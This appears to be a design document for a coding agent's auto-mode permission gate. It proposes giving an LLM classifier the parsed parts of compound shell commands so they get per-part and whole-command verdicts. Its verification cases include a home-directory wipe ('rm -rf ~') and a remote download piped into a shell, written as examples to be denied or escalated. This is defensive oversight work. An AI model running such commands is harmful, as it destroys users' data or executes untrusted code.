<!-- docket:backlink:start (generated — do not hand-edit) -->
> ↩ **[Change 0142 — Compound shell commands reach the auto-mode classifier with decomposed structure](../../changes/active/0142-compound-shell-commands-reach-the-auto-mode-classifier-with.md)**
<!-- docket:backlink:end -->

# Compound shell commands reach the auto-mode classifier with decomposed structure

## Problem

In auto mode, compound shell commands are the top source of human approval
interrupts. A command like `make test && git status`, `cat foo | grep bar`, or
`echo $(git rev-parse HEAD)` cannot be proven safe by the gate's deterministic
layers, which reason first-token-at-a-time. The parser *does* decompose these
into parts, but that structure is discarded before the LLM classifier is
consulted — the classifier receives only the raw command string. Seeing no
structure, it verdicts conservatively (ask/deny), or the command falls through
to the y/N/a human prompt. The user ends up shepherding every multi-step
command by hand: the exact prompt fatigue auto mode exists to eliminate.

Change 0070 widened shell-parse but deliberately left the classifier-facing
contract alone. This change extends that contract so the classifier verdicts
with the same structure the parser already produced.

## Design

### Where it hooks in

The auto-mode authorization pipeline is ordered: deterministic rules layer
(catastrophic deny, scoped allow) → shell-parse heuristics → LLM classifier
(gray area) → human ask. The classifier seam is `internal/permissions`
`Classifier`, built in `cmd/fuse/run.go` `autoModeOptions` and given workspace
context via `WithWorkspaceContext`. Today the pending-call prompt carries the
raw command and the workspace geography, but not the parse decomposition.

### What changes

1. **Carry the decomposition to the classifier.** When the gate's shell parser
   decomposes a compound command into parts — pipeline stages, `&&` / `||` / `;`
   operands, and command substitutions — the auto-mode layer passes the full
   structure to the classifier: the raw command, plus each part with its own
   first-token classification and any per-part deterministic verdict already
   reached. The classifier's pending-call request gains a structured `parts`
   field alongside the existing raw command.

2. **Extend the classifier prompt to verdict compositionally.** The prompt is
   extended so the classifier returns a verdict per part and for the
   composition as a whole. A compound is auto-approved only when **every** part
   is independently safe **and** the composition introduces no new risk (the
   canonical unsafe composition: a producer piped into a shell, or a command
   substitution whose result is executed). Any single unclassifiable or unsafe
   part keeps today's behavior — gray-area parts route to the human ask, unsafe
   parts deny.

3. **Attribute compound decisions in the audit record.** The `LayerClassifier`
   audit entry for a compound decision carries the per-part verdicts, so an
   approved (or denied) compound stays attributable to the specific part that
   drove the outcome — not just the raw string.

### What does not change

- The deterministic catastrophic-deny set and the permission floor are
  evaluated before the classifier is consulted, exactly as today.
- Unparseable commands still bypass the classifier and ask the human (the
  existing fail-closed path).
- Smart, prompt-all, and off modes are untouched; this is auto-mode only.

## Boundaries

- **Not** widening the deterministic scoped-allow rules (new provable-safe
  command shapes) — that is a 0068-style follow-up.
- **Not** session-scoped / remembered approvals ("always allow this shape") —
  a separate grant-model change.
- **Not** retuning the classifier's risk bias beyond passing the new structural
  context — 0069 owns the base prompt contract.
- **Not** changing the human prompt UX itself.

## Verification

- A compound of independently-safe parts (`make test && git status`,
  `cat x | grep y`) is auto-approved with no human prompt, and the audit record
  shows per-part allows.
- A compound with one unsafe part (`cat x && rm -rf ~`) is denied at the
  unsafe part; one gray-area part (`make test && curl https://x | sh`) still
  reaches the human ask.
- An unparseable compound keeps the existing bypass-classifier/ask-human path.
- Smart / prompt-all / off modes are byte-for-byte behavior-identical.
